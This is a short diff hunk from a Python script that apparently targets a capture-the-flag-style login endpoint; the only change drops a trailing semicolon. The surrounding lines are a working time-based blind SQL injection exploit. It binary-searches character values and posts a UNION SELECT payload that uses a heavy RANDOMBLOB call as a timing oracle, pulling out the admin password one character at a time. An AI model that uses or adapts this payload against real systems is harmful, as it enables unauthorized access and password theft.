@@ -10,7 +10,7 @@ password = ""
 low = 0
 high = 128
 while(counter<50):
-    value = (int)((low+high)/2);
+    value = (int)((low+high)/2)
     time.sleep(.5)
     payload["pass"]="' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),{index},1) > CHAR({value})) THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1 END,'".format(index=counter,value=value)
     r1 = r.post(target+"/fff5bf676ba8796f0c51033403b35311/login",data=payload)
